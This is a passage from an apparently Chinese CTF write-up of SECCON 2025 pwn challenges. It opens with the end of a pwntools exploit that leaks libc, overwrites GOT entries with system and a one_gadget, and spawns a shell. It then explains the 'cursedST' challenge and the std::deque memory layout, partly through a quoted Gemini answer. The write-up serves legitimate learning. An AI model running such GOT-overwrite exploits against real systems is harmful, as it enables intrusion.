</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;array[1052676] = &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>low</span> <span class=o>=</span> <span class=n>recv_number</span><span class=p>(</span><span class=n>io</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>create_packet</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=p>(</span><span class=n>malloc_got</span> <span class=o>+</span> <span class=mh>0x4</span><span class=p>)</span> <span class=o>//</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;array[1052677] = &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>high</span> <span class=o>=</span> <span class=n>recv_number</span><span class=p>(</span><span class=n>io</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=p>(</span><span class=n>high</span> <span class=o>&lt;&lt;</span> <span class=mi>32</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>low</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span><span class=p>)</span> <span class=o>-</span> <span class=mh>0x00000000000ad650</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;libc_base: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>one_gadget</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0xd4f5f</span>
</span></span><span class=line><span class=cl><span class=n>system</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>create_packet</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>exit_got</span> <span class=o>//</span> <span class=mi>4</span><span class=p>,</span> <span class=n>main</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>create_packet</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=p>(</span><span class=n>exit_got</span> <span class=o>+</span> <span class=mh>0x4</span><span class=p>)</span> <span class=o>//</span> <span class=mi>4</span><span class=p>,</span> <span class=n>main</span> <span class=o>&gt;&gt;</span> <span class=mi>32</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>create_packet</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>malloc_got</span> <span class=o>//</span> <span class=mi>4</span><span class=p>,</span> <span class=n>system</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>create_packet</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=p>(</span><span class=n>malloc_got</span> <span class=o>+</span> <span class=mh>0x4</span><span class=p>)</span> <span class=o>//</span> <span class=mi>4</span><span class=p>,</span> <span class=n>system</span> <span class=o>&gt;&gt;</span> <span class=mi>32</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>create_packet</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>bss</span> <span class=o>//</span> <span class=mi>4</span><span class=p>,</span> <span class=n>u32</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin&#39;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>create_packet</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=p>(</span><span class=n>bss</span> <span class=o>+</span> <span class=mh>0x4</span><span class=p>)</span> <span class=o>//</span> <span class=mi>4</span><span class=p>,</span> <span class=n>u32</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>create_packet</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=p>(</span><span class=n>exit_got</span> <span class=o>+</span> <span class=mh>0x4</span><span class=p>)</span> <span class=o>//</span> <span class=mi>4</span><span class=p>,</span> <span class=n>one_gadget</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>create_packet</span><span class=p>(</span><span class=n>bss</span> <span class=o>//</span> <span class=mi>4</span><span class=p>,</span> <span class=n>bss</span> <span class=o>//</span> <span class=mi>4</span><span class=p>,</span> <span class=n>bss</span> <span class=o>//</span> <span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><blockquote><p>这题出现了本地通远程不通的情况，原因是没有<code>sleep(0.1)</code>，也算是学到了吧。以后遇到本地通远程不通也可以本地<code>build </code>一下<code>docker</code>打一下试试看，调试看是什么问题。</p></blockquote><p><img alt=image-20251215221913530 loading=lazy src=/posts/ctf/secconctf2025-writeup/assets/image-20251215221913530.png></p><h3 id=cursedst>cursedST<a hidden class=anchor aria-hidden=true href=#cursedst>#</a></h3><p>题目源码</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;iostream&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stack&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=n>std</span><span class=o>::</span><span class=n>string</span> <span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>std</span><span class=o>::</span><span class=n>stack</span><span class=o>&lt;</span><span class=kt>size_t</span><span class=o>&gt;</span> <span class=n>S</span><span class=p>,</span> <span class=n>T</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>size_t</span> <span class=n>op</span><span class=p>,</span> <span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;What&#39;s your name?&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>cin</span> <span class=o>&gt;&gt;</span> <span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;Hello, &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>name</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;!&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=n>std</span><span class=o>::</span><span class=n>cin</span><span class=p>.</span><span class=nf>good</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>cin</span> <span class=o>&gt;&gt;</span> <span class=n>op</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>op</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>std</span><span class=o>::</span><span class=n>cin</span> <span class=o>&gt;&gt;</span> <span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>S</span><span class=p>.</span><span class=nf>push</span><span class=p>(</span><span class=n>val</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>op</span> <span class=o>==</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>S</span><span class=p>.</span><span class=nf>pop</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>op</span> <span class=o>==</span> <span class=mi>3</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>std</span><span class=o>::</span><span class=n>cin</span> <span class=o>&gt;&gt;</span> <span class=n>val</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>T</span><span class=p>.</span><span class=nf>push</span><span class=p>(</span><span class=n>val</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>op</span> <span class=o>==</span> <span class=mi>4</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>T</span><span class=p>.</span><span class=nf>pop</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>程序保护</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>    Arch:       amd64-64-little
</span></span><span class=line><span class=cl>    RELRO:      Partial RELRO
</span></span><span class=line><span class=cl>    Stack:      Canary found
</span></span><span class=line><span class=cl>    NX:         NX enabled
</span></span><span class=line><span class=cl>    PIE:        No PIE <span class=o>(</span>0x400000<span class=o>)</span>
</span></span><span class=line><span class=cl>    SHSTK:      Enabled
</span></span><span class=line><span class=cl>    IBT:        Enabled
</span></span><span class=line><span class=cl>    Stripped:   No
</span></span></code></pre></div><p>显然，问题出现在没有检查<code>stack</code>是不是空的就进行<code>pop</code>，所以想要<code>pwn</code>下来这道题首先得了解<code>std::stack</code>。</p><p><code>std::stack</code>是通过<code>std::deque</code>实现的，先给出两个结构体（再给一个<code>std::string</code>的，也会用到），再给出AI生成的我觉得很好理解的回答</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl>  <span class=c1>// Deque 迭代器结构 (0x20 bytes)
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>struct</span> <span class=nc>_Deque_iterator</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=n>cur</span><span class=p>;</span>    <span class=c1>// +0x00: 当前位置指针
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=n>first</span><span class=p>;</span>  <span class=c1>// +0x08: buffer 起始
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=n>last</span><span class=p>;</span>   <span class=c1>// +0x10: buffer 结束
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>**</span><span class=n>node</span><span class=p>;</span>  <span class=c1>// +0x18: map 中的 node 指针
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// Deque 主结构 (0x60 bytes)
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>struct</span> <span class=nc>std_deque</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>**</span><span class=n>_M_map</span><span class=p>;</span>           <span class=c1>// +0x00: map 数组指针
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>_M_map_size</span><span class=p>;</span>        <span class=c1>// +0x08: map 大小
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=k>struct</span> <span class=nc>_Deque_iterator</span> <span class=n>_M_start</span><span class=p>;</span>  <span class=c1>// +0x10: 起始迭代器
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=k>struct</span> <span class=nc>_Deque_iterator</span> <span class=n>_M_finish</span><span class=p>;</span> <span class=c1>// +0x30: 结束迭代器
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>string</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 1. 字符串的实际指针（指向下面 Union 中的 local_buf 或 堆地址）
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>char</span><span class=o>*</span> <span class=n>_M_p</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>    <span class=c1>// 2. 长度 (size)
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>size_t</span> <span class=n>_M_string_length</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>    <span class=c1>// 3. 核心存储区：这是一个联合体，同一时间只能用其中一种
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>union</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// [模式 A: 长字符串]
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// 当字符串很长时，这里存储容量(capacity)
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// 数据存储在 _M_p 指向的堆内存中
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>size_t</span> <span class=n>_M_allocated_capacity</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>        <span class=c1>// [模式 B: 短字符串 (SSO)]
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// 当字符串很短（&lt;= 15 char）时，直接存在这个数组里！
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// 此时 _M_p 指向这个 local_buf 的首地址
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>char</span> <span class=n>_M_local_buf</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span> 
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p>这是gemini生成的回答，有助于理解。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>这是一个非常硬核的视角！你提供的结构体正是逆向工程（如使用 IDA Pro）时常见的 C++ 标准库（特别是 GCC libstdc++）中 <span class=sb>`</span>std::deque<span class=sb>`</span> 的内存布局。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>由于 <span class=sb>`</span>std::stack<span class=sb>`</span> 默认只是 <span class=sb>`</span>std_deque<span class=sb>`</span> 的一个包装壳，**<span class=sb>`</span>std::stack<span class=sb>`</span> <span class=nv>的内存布局</span> <span class=o>=</span> <span class=sb>`</span>std_deque<span class=sb>`</span> 的内存布局**。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>所有的 <span class=sb>`</span>push<span class=sb>`</span> 和 <span class=sb>`</span>pop<span class=sb>`</span> 操作，本质上都是在操纵 <span class=sb>`</span>_M_finish<span class=sb>`</span> 这个迭代器，以及背后的 <span class=sb>`</span>_M_map<span class=sb>`</span>（中控器）。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>我们用一个具体的场景，结合你提供的结构体字段，来演示内存是如何变化的。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>### 场景设定</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>假设：
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>1. 我们存储的是 <span class=sb>`</span>unsigned __int64<span class=sb>`</span> <span class=o>(</span>8字节<span class=o>)</span>。
</span></span><span class=line><span class=cl>2. 为了演示方便，假设一个**Buffer <span class=o>(</span>数据块<span class=o>)</span>** 只能存 **8个元素** <span class=o>(</span>实际通常是 512字节<span class=o>)</span>。
</span></span><span class=line><span class=cl>3. **Map <span class=o>(</span>中控数组<span class=o>)</span>** 已经分配好。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>### 阶段 1: 初始化 (空栈)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>当你声明 <span class=sb>`</span>std::stack&lt;size_t&gt; S<span class=p>;</span><span class=sb>`</span> 时，内存里发生的事情：
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>1. **<span class=sb>`</span>_M_map<span class=sb>`</span>**: 分配一个小数组（比如存8个指针）。
</span></span><span class=line><span class=cl>2. **分配第一个 Buffer**: 假设地址为 <span class=sb>`</span>0x1000<span class=sb>`</span>。
</span></span><span class=line><span class=cl>3. **初始化迭代器**: <span class=sb>`</span>_M_start<span class=sb>`</span> 和 <span class=sb>`</span>_M_finish<span class=sb>`</span> 都指向这个 Buffer 的中间（为了支持双端插入，虽然 stack 只用一端）。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>**内存快照：**
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>- **<span class=sb>`</span>_M_map<span class=sb>`</span>**: 指向 <span class=sb>`</span><span class=o>[</span>NULL, NULL, 0x1000, NULL ...<span class=o>]</span><span class=sb>`</span>
</span></span><span class=line><span class=cl>- **<span class=sb>`</span>_M_finish<span class=sb>`</span> 结构体内容 <span class=o>(</span>当前栈顶指针<span class=o>)</span>**:
</span></span><span class=line><span class=cl>  - <span class=sb>`</span>node<span class=sb>`</span>: 指向 <span class=sb>`</span>_M_map<span class=sb>`</span> 中存 <span class=sb>`</span>0x1000<span class=sb>`</span> 的那个位置。
</span></span><span class=line><span class=cl>  - <span class=sb>`</span>first<span class=sb>`</span>: <span class=sb>`</span>0x1000<span class=sb>`</span> <span class=o>(</span>当前 Buffer 起始<span class=o>)</span>
</span></span><span class=line><span class=cl>  - <span class=sb>`</span>last<span class=sb>`</span>: <span class=sb>`</span>0x1040<span class=sb>`</span> <span class=o>(</span>当前 Buffer 结束, 0x1000 + 8*8<span class=o>)</span>
</span></span><span class=line><span class=cl>  - <span class=sb>`</span>cur<span class=sb>`</span>: <span class=sb>`</span>0x1000<span class=sb>`</span> <span class=o>(</span>当前指向位置，表示下一个写入点<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>### 阶段 2: 正常的 `push(10)` (Buffer 未满)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>执行 <span class=sb>`</span>S.push<span class=o>(</span>10<span class=o>)</span><span class=sb>`</span>。实际上是操作 <span class=sb>`</span>_M_finish<span class=sb>`</span>。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>**操作步骤：**
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>1. **写入数据**: 将 <span class=sb>`</span>10<span class=sb>`</span> 写入 <span class=sb>`</span>_M_finish.cur<span class=sb>`</span> 指向的地址 <span class=o>(</span><span class=sb>`</span>0x1000<span class=sb>`</span><span class=o>)</span>。
</span></span><span class=line><span class=cl>2. **移动指针**: <span class=sb>`</span>_M_finish.cur<span class=sb>`</span> 自增 8字节 <span class=o>(</span><span class=sb>`</span>unsigned __int64<span class=sb>`</span>的大小<span class=o>)</span>。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>**内存变化：**
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>- 地址 <span class=sb>`</span>0x1000<span class=sb>`</span> 的值变更为 <span class=sb>`</span>10<span class=sb>`</span>。
</span></span><span class=line><span class=cl>- <span class=sb>`</span>_M_finish.cur<span class=sb>`</span> 变为 <span class=sb>`</span>0x1008<span class=sb>`</span>。
</span></span><span class=line><span class=cl>- <span class=sb>`</span>_M_finish.node<span class=sb>`</span>, <span class=sb>`</span>first<span class=sb>`</span>, <span class=sb>`</span>last<span class=sb>`</span> **保持不变** <span class=o>(</span>还在同一个 Buffer 里<span class=o>)</span>。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>### 阶段 3: 跨越边界的 `push(99)` (触发新 Buffer 分配)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>假设我们已经 push 了 <span class=m>8</span> 次，Buffer 满了。
</span></span><span class=line><span class=cl>此时 <span class=sb>`</span>_M_finish.cur<span class=sb>`</span> 等于 <span class=sb>`</span>_M_finish.last<span class=sb>`</span> <span class=o>(</span>即 <span class=sb>`</span>0x1040<span class=sb>`</span><span class=o>)</span>。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>现在执行 <span class=sb>`</span>S.push<span class=o>(</span>99<span class=o>)</span><span class=sb>`</span>。**这是 deque 最精髓的地方。**
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>**操作步骤：**
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>1. **检测**: 发现 <span class=sb>`</span><span class=nv>cur</span> <span class=o>==</span> last<span class=sb>`</span>，当前 Buffer 已无空间。
</span></span><span class=line><span class=cl>2. **分配新 Buffer**: 系统 <span class=sb>`</span>malloc<span class=sb>`</span> 一块新内存，地址 <span class=sb>`</span>0x2000<span class=sb>`</span>。
</span></span><span class=line><span class=cl>3. **更新 Map**: 将 <span class=sb>`</span>0x2000<span class=sb>`</span> 填入 <span class=sb>`</span>_M_map<span class=sb>`</span> 的下一个空槽位。
</span></span><span class=line><span class=cl>4. **跳跃 <span class=o>(</span>核心<span class=o>)</span>**: 更新 <span class=sb>`</span>_M_finish<span class=sb>`</span> 迭代器，让它“跳”到新 Buffer。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>**内存变化 <span class=o>(</span>修改 <span class=sb>`</span>_M_finish<span class=sb>`</span> 结构体<span class=o>)</span>：**
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>- <span class=sb>`</span>node<span class=sb>`</span>: 指针移向 <span class=sb>`</span>_M_map<span class=sb>`</span> 的下一格 <span class=o>(</span>指向存 <span class=sb>`</span>0x2000<span class=sb>`</span> 的地方<span class=o>)</span>。
</span></span><span class=line><span class=cl>- <span class=sb>`</span>first<span class=sb>`</span>: 变为 <span class=sb>`</span>0x2000<span class=sb>`</span> <span class=o>(</span>新 Buffer 起始<span class=o>)</span>。
</span></span><span class=line><span class=cl>- <span class=sb>`</span>last<span class=sb>`</span>: 变为 <span class=sb>`</span>0x2040<span class=sb>`</span> <span class=o>(</span>新 Buffer 结束<span class=o>)</span>。
</span></span><span class=line><span class=cl>- <span class=sb>`</span>cur<span class=sb>`</span>: 变为 <span class=sb>`</span>0x2000<span class=sb>`</span> <span class=o>(</span>指向新 Buffer 第一个位置<span class=o>)</span>。
</span></span><span class=line><span class=cl>- **写入**: 将 <span class=sb>`</span>99<span class=sb>`</span> 写入 <span class=sb>`</span>0x2000<span class=sb>`</span>。
</span></span><span class=line><span class=cl>- **自增**: <span class=sb>`</span>cur<span class=sb>`</span> 变为 <span class=sb>`</span>0x2008<span class=sb>`</span>。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&gt; **注意**：这就解释了为什么 <span class=sb>`</span>std::stack<span class=sb>`</span> 扩容不需要拷贝旧数据。旧的 <span class=sb>`</span>0x1000<span class=sb>`</span> 那个 Buffer 动都没动，我们只是把“光标”移到了新的纸张上。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>### 阶段 4: `pop()` (回退)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>现在执行 <span class=sb>`</span>S.pop<span class=o>()</span><span class=sb>`</span>。我们需要移除刚才 push 的 <span class=sb>`</span>99<span class=sb>`</span>。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>**操作步骤：**
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>1. **检测**: 检查 <span class=sb>`</span>_M_finish.cur<span class=sb>`</span> 是否等于 <span class=sb>`</span>_M_finish.first<span class=sb>`</span>。
</span></span><span class=line><span class=cl>   - 当前 <span class=sb>`</span>cur<span class=sb>`</span> 是 <span class=sb>`</span>0x2008<span class=sb>`</span>，<span class=sb>`</span>first<span class=sb>`</span> 是 <span class=sb>`</span>0x2000<span class=sb>`</span>。不相等，说明当前 Buffer 里有东西。
</span></span><span class=line><span class=cl>2. **回退**: <span class=sb>`</span>_M_finish.cur<span class=sb>`</span> 减 8。
</span></span><span class=line><span class=cl>   - <span class=sb>`</span>cur<span class=sb>`</span> 变回 <span class=sb>`</span>0x2000<span class=sb>`</span>。
</span></span><span class=line><span class=cl>3. **逻辑删除**: 此时 <span class=sb>`</span>cur<span class=sb>`</span> 指向 <span class=sb>`</span>99<span class=sb>`</span> 所在的位置，但在逻辑上它已经是“无效区域”了。下一次 push 会直接覆盖它。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>### 阶段 5: 跨越边界的 `pop()` (释放 Buffer)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>假设我们在新 Buffer 里只存了一个 <span class=sb>`</span>99<span class=sb>`</span>，现在 <span class=sb>`</span>pop<span class=sb>`</span> 掉了。再次执行 <span class=sb>`</span>S.pop<span class=o>()</span><span class=sb>`</span>（要删除上一个 Buffer 的最后一个元素）。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>**操作步骤：**
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>1. **检测**: <span class=sb>`</span>_M_finish.cur<span class=sb>`</span> <span class=o>(</span><span class=sb>`</span>0x2000<span class=sb>`</span><span class=o>)</span> 等于 <span class=sb>`</span>_M_finish.first<span class=sb>`</span> <span class=o>(</span><span class=sb>`</span>0x2000<span class=sb>`</span><span class=o>)</span>。这意味着当前 Buffer 空了（或者说光标已经退到了边缘）。
</span></span><span class=line><span class=cl>2. **释放 <span class=o>(</span>可选<span class=o>)</span>**: 标准库可能会释放 <span class=sb>`</span>0x2000<span class=sb>`</span> 这块内存，或者为了性能先缓存着。假设释放了。
</span></span><span class=line><span class=cl>3. **回跳 <span class=o>(</span>核心<span class=o>)</span>**:
</span></span><span class=line><span class=cl>   - <span class=sb>`</span>node<span class=sb>`</span>: 回退一格，指向 <span class=sb>`</span>0x1000<span class=sb>`</span> 的 Map 条目。
</span></span><span class=line><span class=cl>   - <span class=sb>`</span>first<span class=sb>`</span>: 变回 <span class=sb>`</span>0x1000<span class=sb>`</span>。
</span></span><span class=line><span class=cl>   - <span class=sb>`</span>last<span class=sb>`</span>: 变回 <span class=sb>`</span>0x1040<span class=sb>`</span>。
</span></span><span class=line><span class=cl>   - <span class=sb>`</span>cur<span class=sb>`</span>: **直接设为 <span class=sb>`</span>0x1040<span class=sb>`</span> <span class=o>(</span>即 <span class=sb>`</span>last<span class=sb>`</span><span class=o>)</span>**。
</span></span><span class=line><span class=cl>4. **最终修正**: <span class=sb>`</span>cur<span class=sb>`</span> 减 8，变为 <span class=sb>`</span>0x1038<span class=sb>`</span>。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>### 总结：结构体字段的意义</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>对照你给的 <span class=sb>`</span>_Deque_iterator<span class=sb>`</span> 结构体：
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>|</span> 字段        <span class=p>|</span> 含义           <span class=p>|</span> 在 Stack 中的作用                                            <span class=p>|</span>
